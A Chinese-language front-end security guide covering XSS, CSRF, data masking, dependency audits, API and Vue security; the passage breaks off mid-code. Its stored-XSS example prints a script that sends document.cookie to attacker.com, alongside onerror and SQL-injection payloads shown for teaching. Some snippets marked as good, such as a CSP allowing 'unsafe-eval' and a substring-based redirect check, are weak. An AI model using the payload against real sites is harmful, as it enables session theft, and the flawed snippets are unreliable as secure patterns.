# 前端安全防护详细指南

## 概述

本文档提供全面的前端安全防护指南，基于 OWASP Top 10 安全标准，涵盖 XSS 防护、CSRF 防护、敏感数据处理、依赖包安全等关键领域。适用于 React、Vue、Angular 等现代前端框架。

**核心目标**：
- 防止常见的前端安全攻击
- 保护用户敏感数据
- 确保 API 通信安全
- 管理依赖包安全风险

---

## 一、XSS 防护（跨站脚本攻击）

### 1.1 XSS 攻击类型

**存储型 XSS**
攻击者将恶意代码存储到服务器，用户访问时执行。
```html
<!-- 恶意评论存储在数据库 -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**反射型 XSS**
恶意代码作为 URL 参数，服务器未过滤直接返回。
```javascript
// URL: https://example.com/search?q=<script>alert('xss')</script>
// 页面直接显示搜索词
```

**DOM 型 XSS**
纯客户端攻击，通过操作 DOM 执行恶意代码。
```javascript
// 不安全的代码
document.getElementById('output').innerHTML = location.hash;
```

### 1.2 输入验证与过滤

**白名单验证**
```typescript
// ✅ 良好：使用白名单验证
function sanitizeHTML(html: string): string {
  const allowed = {
    tags: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a', 'img'],
    attributes: {
      'a': ['href', 'title'],
      'img': ['src', 'alt', 'width', 'height'],
    },
  };

  // 使用 DOMPurify 等库进行净化
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: allowed.tags,
    ALLOWED_ATTR: Object.values(allowed.attributes).flat(),
  });
}

// ❌ 危险：黑名单验证（不推荐）
function sanitizeByBlacklist(html: string): string {
  return html
    .replace(/<script>/g, '')
    .replace(/onerror=/g, ''); // 容易被绕过
}
```

**输入格式验证**
```typescript
// ✅ 良好：严格验证输入格式
interface ValidationRules {
  email: RegExp;
  phone: RegExp;
  url: RegExp;
}

const validationRules: ValidationRules = {
  email: /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/,
  phone: /^1[3-9]\d{9}$/,
  url: /^https?:\/\/[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}(\/.*)?$/,
};

function validateInput(value: string, type: keyof ValidationRules): boolean {
  return validationRules[type].test(value);
}
```

### 1.3 输出编码

**HTML 上下文编码**
```typescript
// ✅ 良好：HTML 实体编码
function escapeHtml(text: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };

  return text.replace(/[&<>"'/]/g, char => map[char]);
}

// ✅ 良好：使用 DOMPurify 库
import DOMPurify from 'dompurify';

function safeRenderHTML(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
    ALLOWED_ATTR: [],
  });
}
```

**JavaScript 上下文编码**
```typescript
// ❌ 危险：内联脚本
const userName = '<script>alert(1)</script>';
element.innerHTML = `<span>${userName}</span>`; // 执行恶意脚本

// ✅ 良好：文本内容设置
const userName = '<script>alert(1)</script>';
element.textContent = userName; // 安全转义

// ✅ 良好：使用 setAttribute
element.setAttribute('data-name', escapeHtml(userName));
```

**URL 上下文编码**
```typescript
// ✅ 良好：URL 编码
function safeUrlEncode(url: string): string {
  return encodeURIComponent(url);
}

// ✅ 良好：URL 参数验证
function validateUrlParam(url: string): boolean {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}
```

### 1.4 DOM 操作安全

**避免内联事件处理器**
```typescript
// ❌ 危险：内联事件处理器
<div onclick="handleClick('<%= userInput %>')">点击</div>
<div onload="eval('<%= userInput %>')">加载</div>

// ✅ 良好：使用 addEventListener
const handleClick = (userInput: string) => {
  // 安全处理
};

element.addEventListener('click', () => handleClick(userInput));
```

**避免 eval 和类似函数**
```typescript
// ❌ 危险：使用 eval
const userCode = 'alert("xss")';
eval(userCode); // 执行任意代码

// ❌ 危险：使用 innerHTML
element.innerHTML = userInput; // 可能包含脚本

// ✅ 良好：使用 textContent
element.textContent = userInput; // 自动转义

// ✅ 良好：使用 createTextNode
const textNode = document.createTextNode(userInput);
element.appendChild(textNode);
```

### 1.5 Content Security Policy（CSP）

**CSP 配置示例**
```typescript
// Next.js middleware.ts
import { NextResponse } from 'next/server';

export function middleware(request: Request) {
  const cspHeader = `
    default-src 'self';
    script-src 'self' 'unsafe-inline' 'unsafe-eval' https://trusted-cdn.com;
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    img-src 'self' data: https: blob:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
    form-action 'self';
    base-uri 'self';
    object-src 'none';
  `.replace(/\s{2,}/g, ' ').trim();

  const response = NextResponse.next();
  response.headers.set('Content-Security-Policy', cspHeader);
  response.headers.set('X-Content-Type-Options', 'nosniff');
  response.headers.set('X-Frame-Options', 'DENY');
  response.headers.set('X-XSS-Protection', '1; mode=block');

  return response;
}
```

**严格 CSP 策略**
```typescript
// 严格的 CSP（推荐）
const strictCSP = {
  'default-src': ["'self'"],
  'script-src': ["'self'"], // 禁止内联脚本
  'style-src': ["'self'", "'nonce-{NONCE}'"], // 使用 nonce
  'img-src': ["'self'", 'data:', 'https:'],
  'font-src': ["'self'", 'https://fonts.gstatic.com'],
  'connect-src': ["'self'", 'https://api.example.com'],
  'frame-ancestors': ["'none'"],
  'base-uri': ["'self'"],
  'form-action': ["'self'"],
};
```

### 1.6 第三方内容安全

**iframe 安全**
```typescript
// ✅ 良好：使用 sandbox 属性
<iframe
  src="https://external-site.com"
  sandbox="allow-scripts allow-same-origin"
  loading="lazy"
/>

// ✅ 良好：验证外部 URL
function isSafeIframeSrc(url: string): boolean {
  const allowedDomains = [
    'https://youtube.com',
    'https://player.vimeo.com',
  ];

  try {
    const parsed = new URL(url);
    return allowedDomains.some(domain => parsed.origin === domain);
  } catch {
    return false;
  }
}
```

**外部脚本加载**
```typescript
// ✅ 良好：使用 SRI（子资源完整性）
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap..."
  crossorigin="anonymous"
/>

// ✅ 良好：内容安全脚本
function loadSafeScript(url: string, integrity?: string): Promise<void> {
  return new Promise((resolve, reject) => {
    const script = document.createElement('script');
    script.src = url;
    if (integrity) {
      script.integrity = integrity;
      script.crossOrigin = 'anonymous';
    }
    script.onload = () => resolve();
    script.onerror = () => reject(new Error('脚本加载失败'));
    document.head.appendChild(script);
  });
}
```

---

## 二、CSRF 防护（跨站请求伪造）

### 2.1 CSRF 攻击原理

```
攻击者网站                          受害者网站
    |                                   |
    |  <form action="https://bank.com/transfer">    |
    |      <input name="to" value="attacker"/>      |
    |      <input name="amount" value="10000"/>     |
    |  </form>                                   |
    |                                           |
    |  用户已登录 bank.com，Cookie 有效          |
    |                                           |
    |  自动提交表单（JavaScript 或诱导点击）      |
    |  -----------------------------------------> |
    |      Cookie 被自动携带                      |
    |      请求成功执行                           |
```

### 2.2 CSRF Token 验证

**服务端生成 Token**
```typescript
// ✅ 良好：生成 CSRF Token
import { randomBytes } from 'crypto';

function generateCsrfToken(): string {
  return randomBytes(32).toString('hex');
}

// 存储在 session 中
const csrfToken = generateCsrfToken();
session.csrfToken = csrfToken;
```

**前端发送 Token**
```typescript
// ✅ 良好：在表单中包含 CSRF Token
function SecureForm({ action, method, children }) {
  const csrfToken = getCsrfTokenFromCookie();

  return (
    <form action={action} method={method}>
      <input type="hidden" name="_csrf" value={csrfToken} />
      {children}
    </form>
  );
}

// ✅ 良好：在请求头中发送 Token
async function secureFetch(url: string, options: RequestInit = {}) {
  const csrfToken = getCsrfTokenFromCookie();

  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'X-CSRF-Token': csrfToken,
      'Content-Type': 'application/json',
    },
    credentials: 'include', // 包含 Cookie
  });
}
```

**Token 验证**
```typescript
// ✅ 良好：验证 CSRF Token
function validateCsrfToken(requestToken: string, sessionToken: string): boolean {
  if (!requestToken || !sessionToken) {
    return false;
  }

  // 使用时间常量比较，防止时序攻击
  return timingSafeEqual(
    Buffer.from(requestToken),
    Buffer.from(sessionToken)
  );
}
```

### 2.3 SameSite Cookie

**Cookie 配置**
```typescript
// ✅ 良好：SameSite Cookie 配置
const cookieOptions = {
  httpOnly: true,  // 禁止 JavaScript 访问
  secure: true,    // 仅 HTTPS
  sameSite: 'strict', // 完全阻止跨站请求
  maxAge: 3600000, // 1小时过期
  path: '/',
};

// Express.js
import cookie from 'cookie';

res.cookie('sessionId', sessionId, cookieOptions);

// Next.js
import { cookies } from 'next/headers';

cookies().set('sessionId', sessionId, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'strict',
  maxAge: 3600,
});
```

**SameSite 选项说明**
```typescript
// 'Strict': 完全阻止跨站请求（推荐用于敏感操作）
// 'Lax': 允许安全的顶级导航（用户从外部链接进入）
// 'None': 允许所有跨站请求（必须配合 Secure）
```

### 2.4 双重提交 Cookie

**实现模式**
```typescript
// ✅ 良好：双重提交 Cookie 模式
function DoubleSubmitCookiePattern() {
  // 1. 生成随机 Token
  const csrfToken = generateCsrfToken();

  // 2. 设置 Cookie（JavaScript 可读）
  document.cookie = `csrfToken=${csrfToken}; SameSite=Lax; path=/`;

  // 3. 在表单中添加隐藏字段
  return (
    <form action="/api/submit" method="POST">
      <input type="hidden" name="csrfToken" value={csrfToken} />
      {/* 其他表单字段 */}
    </form>
  );
}

// ✅ 良好：验证双重提交
async function validateDoubleSubmit(
  cookieToken: string,
  bodyToken: string
): Promise<boolean> {
  // 1. 验证 Cookie 和 Body 中的 Token 匹配
  if (!timingSafeEqual(cookieToken, bodyToken)) {
    return false;
  }

  // 2. 验证 Token 格式
  if (!isValidTokenFormat(cookieToken)) {
    return false;
  }

  return true;
}
```

---

## 三、敏感数据处理

### 3.1 数据脱敏

**常见脱敏模式**
```typescript
// ✅ 良好：邮箱脱敏
function maskEmail(email: string): string {
  const [name, domain] = email.split('@');
  if (name.length <= 2) {
    return `${name[0]}***@${domain}`;
  }
  return `${name.slice(0, 2)}***@${domain}`;
}

// ✅ 良好：手机号脱敏
function maskPhone(phone: string): string {
  return phone.replace(/(\d{3})\d{4}(\d{4})/, '$1****$2');
}

// ✅ 良好：身份证脱敏
function maskIdCard(idCard: string): string {
  return idCard.replace(/(\d{6})\d{8}(\d{4})/, '$1********$2');
}

// ✅ 良好：银行卡脱敏
function maskBankCard(cardNumber: string): string {
  return cardNumber.replace(/(\d{4})\d{8,12}(\d{4})/, '$1 **** **** $2');
}
```

**用户界面显示**
```typescript
// ✅ 良好：安全显示敏感信息
interface SafeDisplayProps {
  value: string;
  type: 'email' | 'phone' | 'idCard' | 'bankCard';
  showFull?: boolean; // 需要授权才能显示完整
}

function SafeDisplay({ value, type, showFull = false }: SafeDisplayProps) {
  const [isRevealed, setIsRevealed] = useState(false);

  const getMaskedValue = () => {
    switch (type) {
      case 'email': return maskEmail(value);
      case 'phone': return maskPhone(value);
      case 'idCard': return maskIdCard(value);
      case 'bankCard': return maskBankCard(value);
    }
  };

  return (
    <span>
      {showFull || isRevealed ? value : getMaskedValue()}
      {!showFull && (
        <button onClick={() => setIsRevealed(!isRevealed)}>
          {isRevealed ? '隐藏' : '显示'}
        </button>
      )}
    </span>
  );
}
```

### 3.2 本地存储安全

**安全存储策略**
```typescript
// ✅ 良好：使用加密存储
import CryptoJS from 'crypto-js';

class SecureStorage {
  private secretKey: string;

  constructor(secretKey: string) {
    this.secretKey = secretKey;
  }

  set(key: string, value: any): void {
    const encrypted = CryptoJS.AES.encrypt(
      JSON.stringify(value),
      this.secretKey
    );
    localStorage.setItem(key, encrypted.toString());
  }

  get<T>(key: string): T | null {
    const encrypted = localStorage.getItem(key);
    if (!encrypted) return null;

    const decrypted = CryptoJS.AES.decrypt(encrypted, this.secretKey);
    return JSON.parse(decrypted.toString(CryptoJS.enc.Utf8)) as T;
  }

  remove(key: string): void {
    localStorage.removeItem(key);
  }
}

// ✅ 良好：敏感数据不存储
// 原则：Token、密码等敏感数据不应存储在前端
// 如必须存储，使用 httpOnly Cookie 或加密存储
```

**存储数据分类**
```typescript
// ✅ 良好：数据分类存储
const StorageStrategy = {
  // 敏感数据：使用 httpOnly Cookie
  sensitive: ['authToken', 'refreshToken', 'password'],

  // 私密数据：加密存储
  private: ['userProfile', 'paymentInfo', 'idCard'],

  // 一般数据：普通 localStorage
  general: ['theme', 'preferences', 'recentSearch'],
};

// ✅ 良好：定期清理
function cleanupStorage(): void {
  const STORAGE_EXPIRY = 7 * 24 * 60 * 60 * 1000; // 7天
  const now = Date.now();

  Object.keys(localStorage).forEach(key => {
    const item = localStorage.getItem(key);
    if (item) {
      const { data, timestamp } = JSON.parse(item);
      if (now - timestamp > STORAGE_EXPIRY) {
        localStorage.removeItem(key);
      }
    }
  });
}
```

### 3.3 密钥管理

**环境变量使用**
```typescript
// ✅ 良好：使用环境变量存储密钥
// .env.production
NEXT_PUBLIC_API_KEY=pk_test_xxxxxxxxxxxxx
API_SECRET_KEY=sk_test_xxxxxxxxxxxxx

// ❌ 危险：硬编码密钥
const API_KEY = 'sk_live_xxxxxxxxxxxxx'; // 危险！

// ✅ 良好：通过环境变量访问
const apiKey = process.env.NEXT_PUBLIC_API_KEY;

// ✅ 良好：密钥轮换
const keyVersion = 'v2';
const apiKey = process.env[`API_KEY_${keyVersion}`];
```

**密钥验证**
```typescript
// ✅ 良好：验证密钥格式
function isValidApiKeyFormat(key: string): boolean {
  // API Key 应有足够长度和复杂度
  if (key.length < 32) return false;
  if (!/^[A-Za-z0-9_-]+$/.test(key)) return false;
  return true;
}

// ✅ 良好：密钥存储在服务器端
// 永远不要在前端代码中包含私钥
// 使用后端 API 作为代理访问第三方服务
```

### 3.4 日志脱敏

**日志级别控制**
```typescript
// ✅ 良好：日志分级
enum LogLevel {
  ERROR = 0,
  WARN = 1,
  INFO = 2,
  DEBUG = 3,
}

const currentLevel = process.env.NODE_ENV === 'production'
  ? LogLevel.ERROR
  : LogLevel.DEBUG;

// ✅ 良好：敏感数据过滤
function sanitizeForLog(data: any): any {
  const sensitiveFields = [
    'password', 'token', 'secret', 'apiKey',
    'creditCard', 'ssn', 'phone', 'email',
  ];

  if (typeof data !== 'object' || data === null) {
    return data;
  }

  const sanitized = { ...data };
  for (const field of sensitiveFields) {
    if (field in sanitized) {
      sanitized[field] = '[REDACTED]';
    }
  }

  return sanitized;
}

// ✅ 良好：安全日志记录
function safeLog(level: LogLevel, message: string, context?: any): void {
  if (level > currentLevel) return;

  const logEntry = {
    timestamp: new Date().toISOString(),
    level: LogLevel[level],
    message,
    context: context ? sanitizeForLog(context) : undefined,
  };

  console.log(JSON.stringify(logEntry));
}
```

---

## 四、依赖包安全

### 4.1 依赖审计

**npm audit**
```bash
# 运行依赖安全审计
npm audit

# 详细输出
npm audit --audit-level=high

# 修复可自动修复的问题
npm audit fix

# 强制修复（可能破坏代码）
npm audit fix --force
```

**依赖分析工具**
```bash
# npm install 检查
npx npm-install-checks

# Snyk 安全扫描
npx snyk test

# 持续监控
npx snyk monitor
```

### 4.2 已知漏洞检测

**自动化检查配置**
```json
// package.json - 添加审计脚本
{
  "scripts": {
    "security:audit": "npm audit --audit-level=high",
    "security:snyk": "snyk test",
    "security:all": "npm run security:audit && npm run security:snyk"
  }
}
```

**CI/CD 集成**
```yaml
# GitHub Actions - 安全审计
name: Security Audit

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm ci

      - name: Run npm audit
        run: npm audit --audit-level=high
        continue-on-error: true

      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

### 4.3 安全更新策略

**依赖版本管理**
```json
// package.json - 锁定安全版本
{
  "dependencies": {
    "lodash": "^4.17.21",  // 自动更新到最新的 4.x.x
    "axios": "~1.6.0",       // 锁定到 1.6.x
    "express": "4.18.2"      // 完全锁定
  }
}
```

**版本更新流程**
```typescript
// ✅ 良好：渐进式更新
async function updateDependency(dependency: string): Promise<void> {
  // 1. 检查当前版本
  const currentVersion = await getCurrentVersion(dependency);

  // 2. 检查最新安全版本
  const latestVersion = await getLatestVersion(dependency);

  // 3. 检查版本差异
  const diff = await compareVersions(currentVersion, latestVersion);

  // 4. 更新前备份
  await backupPackageLock();

  // 5. 执行更新
  if (diff.major > 0) {
    console.warn('重大版本更新，需要详细测试');
  }

  await execAsync(`npm update ${dependency}@${latestVersion}`);

  // 6. 验证功能
  await runTests();
  await checkVulnerabilities(dependency);
}
```

### 4.4 最小权限原则

**依赖权限审查**
```typescript
// ✅ 良好：审查依赖权限
import { checkFileSystemAccess } from 'permissions-checker';

// 检查包的文件系统访问权限
const permissions = await checkFileSystemAccess('suspicious-package');
if (permissions.readFiles || permissions.writeFiles) {
  console.warn('警告：这个包有文件系统访问权限');
}

// ✅ 良好：使用替代包
// 不使用包含恶意代码的包
// 定期检查依赖树：npm ls <package>
```

---

## 五、API 安全

### 5.1 输入验证

**请求体验证**
```typescript
// ✅ 良好：严格的输入验证
import { z } from 'zod';

const UserSchema = z.object({
  email: z.string().email('无效的邮箱格式'),
  name: z.string().min(2).max(50),
  age: z.number().min(0).max(150),
  website: z.string().url().optional(),
});

const ProductSchema = z.object({
  id: z.string().uuid(),
  quantity: z.number().int().positive(),
  price: z.number().positive(),
});

function validateRequest<T>(schema: z.ZodSchema<T>, data: unknown): T {
  const result = schema.safeParse(data);
  if (!result.success) {
    throw new ValidationError(result.error.issues);
  }
  return result.data;
}
```

**SQL 注入防护**
```typescript
// ❌ 危险：字符串拼接 SQL
const query = `SELECT * FROM users WHERE name = '${userName}'`;

// ✅ 良好：参数化查询
const query = 'SELECT * FROM users WHERE name = $1';
await db.query(query, [userName]);

// ✅ 良好：使用 ORM
const user = await User.findOne({ where: { name: userName } });
```

### 5.2 速率限制

**客户端速率限制**
```typescript
// ✅ 良好：请求节流
class RateLimiter {
  private requests: Map<string, number[]> = new Map();
  private maxRequests: number;
  private windowMs: number;

  constructor(maxRequests: number, windowMs: number) {
    this.maxRequests = maxRequests;
    this.windowMs = windowMs;
  }

  isAllowed(clientId: string): boolean {
    const now = Date.now();
    const timestamps = this.requests.get(clientId) || [];

    // 清理过期时间戳
    const recentRequests = timestamps.filter(
      time => now - time < this.windowMs
    );

    if (recentRequests.length >= this.maxRequests) {
      return false;
    }

    recentRequests.push(now);
    this.requests.set(clientId, recentRequests);
    return true;
  }
}

const rateLimiter = new RateLimiter(100, 60000); // 1分钟最多100次

function apiCall() {
  if (!rateLimiter.isAllowed('client-1')) {
    throw new Error('请求过于频繁，请稍后再试');
  }
  // 执行 API 调用
}
```

**指数退避策略**
```typescript
// ✅ 良好：指数退避重试
async function fetchWithRetry(
  url: string,
  options: RequestInit,
  maxRetries = 3
): Promise<Response> {
  let lastError: Error;

  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);

      if (response.ok) {
        return response;
      }

      // 如果是服务器错误（5xx），重试
      if (response.status >= 500) {
        throw new Error(`Server error: ${response.status}`);
      }

      // 客户端错误（4xx），不重试
      return response;
    } catch (error) {
      lastError = error as Error;

      // 指数退避
      const delay = Math.pow(2, i) * 1000;
      await sleep(delay);
    }
  }

  throw lastError!;
}
```

### 5.3 错误信息处理

**安全错误响应**
```typescript
// ❌ 危险：暴露内部错误
{
  "error": "Database connection failed",
  "stack": "Error: connect ECONNREFUSED\n    at Connection.<anonymous>\n    ...",
  "query": "SELECT * FROM users WHERE id = '1' OR 1=1"
}

// ✅ 良好：通用错误消息
{
  "error": "请求处理失败",
  "errorCode": "INTERNAL_ERROR",
  "requestId": "req_abc123"
}

// ✅ 良好：分级错误处理
enum ErrorCode {
  VALIDATION_ERROR = 'VALIDATION_ERROR',
  AUTHENTICATION_ERROR = 'AUTHENTICATION_ERROR',
  AUTHORIZATION_ERROR = 'AUTHORIZATION_ERROR',
  NOT_FOUND = 'NOT_FOUND',
  RATE_LIMIT_ERROR = 'RATE_LIMIT_ERROR',
  INTERNAL_ERROR = 'INTERNAL_ERROR',
}

function handleApiError(error: Error): Response {
  const errorResponse = {
    error: getPublicMessage(error),
    errorCode: getErrorCode(error),
    requestId: generateRequestId(),
    timestamp: new Date().toISOString(),
  };

  return new Response(JSON.stringify(errorResponse), {
    status: getHttpStatus(error),
    headers: { 'Content-Type': 'application/json' },
  });
}
```

---

## 六、运行时安全

### 6.1 安全头配置

**安全响应头**
```typescript
// ✅ 良好：配置安全响应头
const securityHeaders = {
  // 防止点击劫持
  'X-Frame-Options': 'DENY',

  // 防止 MIME 类型嗅探
  'X-Content-Type-Options': 'nosniff',

  // XSS 防护
  'X-XSS-Protection': '1; mode=block',

  // 引用策略
  'Referrer-Policy': 'strict-origin-when-cross-origin',

  // 权限策略
  'Permissions-Policy': 'geolocation=(), microphone=(), camera=()',

  // 严格传输安全
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',

  // 内容安全策略
  'Content-Security-Policy': "default-src 'self'",
};

function applySecurityHeaders(response: Response): Response {
  const newResponse = new Response(response.body, response);

  Object.entries(securityHeaders).forEach(([key, value]) => {
    newResponse.headers.set(key, value);
  });

  return newResponse;
}
```

### 6.2 防止代码注入

**函数构造器防护**
```typescript
// ❌ 危险：使用 eval 和构造函数
eval('console.log("xss")');
new Function('console.log("xss")')();
setTimeout('console.log("xss")', 0);

// ✅ 良好：使用安全的替代方案
// 使用 JSON.parse 代替 eval
// 使用函数引用代替 Function 构造函数
// 使用 setTimeout(函数引用) 代替 setTimeout(字符串)
```

**正则表达式 DoS 防护**
```typescript
// ❌ 危险：易受 ReDoS 攻击的正则
const unsafePattern = /^(a+)+$/;

// ✅ 良好：使用安全的正则
const safePattern = /^a+$/;

// ✅ 良好：限制正则复杂度
import { RegexCheck } from 'safe-regex';

if (!RegexCheck.isSafe(userProvidedPattern)) {
  throw new Error('正则表达式过于复杂');
}
```

### 6.3 安全评估工具

**自动化安全测试**
```bash
# OWASP ZAP 扫描
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://example.com

# 手动安全测试
npm install -D zaproxy

# Playwright 安全测试
npm install -D playwright

npx playwright test --project=security
```

---

## 七、最佳实践总结

### 7.1 安全检查清单

- [ ] 所有用户输入经过验证和过滤
- [ ] 输出到 DOM 的内容经过编码
- [ ] 敏感数据已脱敏或加密
- [ ] API 请求有 CSRF Token
- [ ] Cookie 设置了安全标志（httpOnly, Secure, SameSite）
- [ ] CSP 策略已配置
- [ ] 依赖包无已知漏洞
- [ ] 安全响应头已设置
- [ ] 错误消息不暴露内部信息
- [ ] 密钥存储在环境变量中

### 7.2 安全开发流程

1. **设计阶段**：安全需求分析，威胁建模
2. **开发阶段**：遵循安全编码规范，输入验证，输出编码
3. **测试阶段**：安全测试，渗透测试，漏洞扫描
4. **部署阶段**：安全配置检查，监控告警设置
5. **维护阶段**：定期审计，及时更新依赖

### 7.3 安全培训资源

- [OWASP Top 10](https://owasp.org/Top10/)
- [Mozilla Security Guidelines](https://wiki.mozilla.org/Security)
- [Google Web Security](https://developers.google.com/web/fundamentals/security)
- [Microsoft Security](https://learn.microsoft.com/en-us/windows/win32/secauthn/authentication-portal)

---

## 八、Vue 框架安全防护

### 8.1 Vue 模板 XSS 防护

**Vue 模板自动转义**
```vue
<!-- ✅ 良好：Vue 模板自动转义 -->
<template>
  <!-- 用户输入会被自动转义 -->
  <div>{{ userInput }}</div>
  
  <!-- 安全：v-text 同样自动转义 -->
  <div v-text="userInput"></div>
</template>

<script setup>
const userInput = '<script>alert("XSS")</script>';
// Vue 会自动转义为 &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
</script>
```

**v-html 的危险用法**
```vue
<!-- ❌ 危险：v-html 不转义 HTML -->
<template>
  <!-- 用户输入直接渲染为 HTML -->
  <div v-html="userContent"></div>
</template>

<script setup>
const userContent = '<img src=x onerror=alert(1)>';
// 会执行 onerror 事件！
</script>

<!-- ✅ 良好：使用 DOMPurify 净化 -->
<template>
  <div v-html="sanitizedContent"></div>
</template>

<script setup>
import DOMPurify from 'dompurify';

const userContent = '<img src=x onerror=alert(1)>';
const sanitizedContent = DOMPurify.sanitize(userContent);
// 输出：<img src="x">（onerror 被移除）
</script>
```

### 8.2 Vue 组件安全

**Props 验证**
```vue
<!-- ✅ 良好：Props 类型验证 -->
<script setup>
import { defineProps } from 'vue';

const props = defineProps({
  // 类型验证
  email: {
    type: String,
    required: true,
    // 自定义验证器
    validator: (value) => {
      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
    },
  },
  
  age: {
    type: Number,
    min: 0,
    max: 150,
  },
  
  status: {
    type: String,
    validator: (value) => {
      return ['active', 'inactive', 'pending'].includes(value);
    },
  },
});
</script>
```

**组件通信安全**
```vue
<!-- ✅ 良好：事件名称验证 -->
<script setup>
import { defineEmits } from 'vue';

const emit = defineEmits({
  // 验证事件参数
  submit: (data) => {
    if (!data.email) {
      console.warn('提交数据缺少邮箱');
      return false; // 阻止事件触发
    }
    return true;
  },
  
  'update:modelValue': (value) => {
    return typeof value === 'string';
  },
});

// 安全的事件触发
function handleSubmit(formData) {
  // 验证数据
  if (validateForm(formData)) {
    emit('submit', formData);
  }
}
</script>
```

### 8.3 Vue 路由安全

**路由参数验证**
```typescript
// ✅ 良好：路由参数验证
import { createRouter, createWebHistory } from 'vue-router';

const router = createRouter({
  history: createWebHistory(),
  routes: [
    {
      path: '/user/:id',
      component: UserProfile,
      // 路由守卫验证参数
      beforeEnter: (to, from, next) => {
        const userId = to.params.id;
        
        // 验证用户ID格式（UUID）
        if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(userId)) {
          next('/404');
          return;
        }
        
        next();
      },
    },
  ],
});

// ✅ 良好：全局路由守卫
router.beforeEach((to, from, next) => {
  // 验证权限
  const requiresAuth = to.matched.some(record => record.meta.requiresAuth);
  const isAuthenticated = store.getters.isAuthenticated;
  
  if (requiresAuth && !isAuthenticated) {
    next('/login');
    return;
  }
  
  // 验证重定向 URL
  if (to.query.redirect) {
    try {
      const url = new URL(to.query.redirect as string);
      if (!url.origin.includes('example.com')) {
        delete to.query.redirect;
      }
    } catch {
      delete to.query.redirect;
    }
  }
  
  next();
});
```

### 8.4 Vue 状态管理安全

**Pinia 安全实践**
```typescript
// ✅ 良好：状态管理安全
import { defineStore } from 'pinia';

export const useUserStore = defineStore('user', {
  state: () => ({
    // 敏感数据不应存储在前端状态
    user: null,
    token: null, // 应使用 httpOnly Cookie
  }),
  
  actions: {
    async login(credentials) {
      // 验证输入
      if (!credentials.email || !credentials.password) {
        throw new Error('请输入邮箱和密码');
      }
      
      // 验证邮箱格式
      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(credentials.email)) {
        throw new Error('无效的邮箱格式');
      }
      
      try {
        const response = await fetch('/api/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(credentials),
        });
        
        const data = await response.json();
        
        // 验证响应数据
        if (!data.user || !data.token) {
          throw new Error('登录失败');
        }
        
        this.user = data.user;
        // token 应存储在 httpOnly Cookie 中，而非状态中
      } catch (error) {
        console.error('登录错误:', error);
        throw error;
      }
    },
    
    logout() {
      // 清除状态
      this.user = null;
      // 调用后端登出接口清除 Cookie
      fetch('/api/logout', { method: 'POST' });
    },
  },
});
```

### 8.5 Vue 指令安全

**自定义指令安全**
```vue
<!-- ✅ 良好：安全的自定义指令 -->
<script setup>
import { createApp, DirectiveBinding } from 'vue';

const app = createApp({});

// 安全的点击指令
app.directive('safe-click', {
  mounted(el, binding: DirectiveBinding) {
    const handler = binding.value;
    
    // 验证处理函数
    if (typeof handler !== 'function') {
      console.warn('v-safe-click 需要传入函数');
      return;
    }
    
    // 防抖处理
    let debounceTimer: number | null = null;
    
    el.addEventListener('click', () => {
      if (debounceTimer) return;
      
      debounceTimer = window.setTimeout(() => {
        try {
          handler();
        } catch (error) {
          console.error('点击处理错误:', error);
        } finally {
          debounceTimer = null;
        }
      }, 300);
    });
  },
});
</script>
```

### 8.6 Vue 3 Composition API 安全

**响应式数据安全**
```vue
<script setup>
import { ref, computed } from 'vue';

// ✅ 良好：响应式数据验证
const email = ref('');
const password = ref('');

// 计算属性验证
const isValid = computed(() => {
  const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value);
  const passwordValid = password.value.length >= 8;
  return emailValid && passwordValid;
});

// ✅ 良好：安全的表单提交
async function handleSubmit() {
  if (!isValid.value) {
    return;
  }
  
  // 添加 CSRF Token
  const csrfToken = document.cookie
    .split('; ')
    .find(row => row.startsWith('csrfToken='))
    ?.split('=')[1];
  
  const response = await fetch('/api/submit', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    },
    credentials: 'include',
    body: JSON.stringify({
      email: email.value,
      password: password.value,
    }),
  });
  
  if (!response.ok) {
    throw new Error('提交失败');
  }
}
</script>
```

### 8.7 Vue 插件安全

**安全的插件开发**
```typescript
// ✅ 良好：安全的 Vue 插件
import type { App } from 'vue';

export default {
  install(app: App, options?: Record<string, unknown>) {
    // 验证选项
    if (options) {
      // 验证敏感配置
      if (options.apiKey && typeof options.apiKey === 'string') {
        // 不应在客户端暴露 API Key
        console.warn('API Key 不应通过插件选项传递');
      }
    }
    
    // 全局属性添加前验证
    app.config.globalProperties.$safeApi = {
      async request(url: string, data?: unknown) {
        // 验证 URL
